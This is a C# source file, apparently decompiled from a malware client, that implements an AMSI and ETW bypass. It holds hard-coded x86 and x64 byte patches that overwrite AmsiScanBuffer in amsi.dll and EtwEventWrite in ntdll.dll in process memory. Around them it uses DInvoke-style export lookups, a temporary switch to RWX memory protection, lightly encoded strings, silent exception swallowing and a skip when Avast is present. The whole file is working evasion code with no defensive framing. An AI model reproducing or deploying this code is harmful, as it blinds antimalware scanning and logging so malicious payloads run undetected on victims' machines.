using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Client.Helper;

internal class AsmiAndETW
{
	public static byte[] x64_etw_patch = new byte[4] { 72, 51, 192, 195 };

	public static byte[] x86_etw_patch = new byte[5] { 51, 192, 194, 20, 0 };

	public static byte[] x64_am_si_patch = new byte[12]
	{
		184, 52, 18, 7, 128, 102, 184, 50, 0, 176,
		87, 195
	};

	public static byte[] x86_am_si_patch = new byte[8] { 184, 87, 0, 7, 128, 194, 24, 0 };

	private static void PatchAmsi(byte[] patch)
	{
		try
		{
			string text = EncryptString.Decode("amsi.dll");
			bool flag = true;
			foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
			{
				if (string.Equals(module.ModuleName, text, StringComparison.OrdinalIgnoreCase))
				{
					PatchMem(patch, text, EncryptString.Decode("AmsiScanBuffer"));
					flag = false;
					break;
				}
			}
			if (flag)
			{
				AggresivAmsiActivate(patch, text);
			}
		}
		catch
		{
		}
	}

	private static void AggresivAmsiActivate(byte[] patch, string dll)
	{
		try
		{
			byte[] array = new byte[new Random().Next(1, 100)];
			new Random().NextBytes(array);
			try
			{
				Assembly.Load(array);
			}
			catch
			{
			}
			foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
			{
				if (string.Equals(module.ModuleName, dll, StringComparison.OrdinalIgnoreCase))
				{
					PatchMem(patch, dll, EncryptString.Decode("AmsiScanBuffer"));
					break;
				}
			}
		}
		catch
		{
		}
	}

	private static void PatchETW(byte[] Patch)
	{
		try
		{
			PatchMem(Patch, EncryptString.Decode("ntdll.dll"), EncryptString.Decode("EtwEventWrite"));
		}
		catch
		{
		}
	}

	private static void PatchMem(byte[] patch, string library, string function)
	{
		try
		{
			IntPtr loadedModuleAddress = DInvokeCore.GetLoadedModuleAddress(library);
			if (loadedModuleAddress == IntPtr.Zero)
			{
				return;
			}
			IntPtr exportAddress = DInvokeCore.GetExportAddress(loadedModuleAddress, function);
			if (exportAddress == IntPtr.Zero)
			{
				return;
			}
			byte[] array = new byte[patch.Length];
			Marshal.Copy(exportAddress, array, 0, patch.Length);
			bool flag = true;
			for (int i = 0; i < patch.Length; i++)
			{
				if (array[i] != patch[i])
				{
					flag = false;
					break;
				}
			}
			if (flag)
			{
				return;
			}
			IntPtr intPtr = new IntPtr(-1);
			IntPtr BaseAddress = exportAddress;
			IntPtr intPtr2 = new IntPtr(patch.Length);
			IntPtr RegionSize = intPtr2;
			uint OldProtect = 0u;
			if (!DllImport.NtProtectVirtualMemory(intPtr, ref BaseAddress, ref RegionSize, 64u, ref OldProtect))
			{
				return;
			}
			try
			{
				Marshal.Copy(patch, 0, exportAddress, patch.Length);
				try
				{
					DllImport.FlushInstructionCache(intPtr, exportAddress, (UIntPtr)(ulong)patch.Length);
				}
				catch
				{
				}
			}
			finally
			{
				IntPtr BaseAddress2 = exportAddress;
				IntPtr RegionSize2 = intPtr2;
				DllImport.NtProtectVirtualMemory(intPtr, ref BaseAddress2, ref RegionSize2, OldProtect, ref OldProtect);
			}
		}
		catch
		{
		}
	}

	public static void Bypass()
	{
		if (Config.AntiVirus.ToLower().Contains(EncryptString.Decode("avast")))
		{
			return;
		}
		try
		{
			if (IntPtr.Size != 4)
			{
				PatchAmsi(x64_am_si_patch);
				PatchETW(x64_etw_patch);
			}
			else
			{
				PatchAmsi(x86_am_si_patch);
				PatchETW(x86_etw_patch);
			}
		}
		catch
		{
		}
	}
}
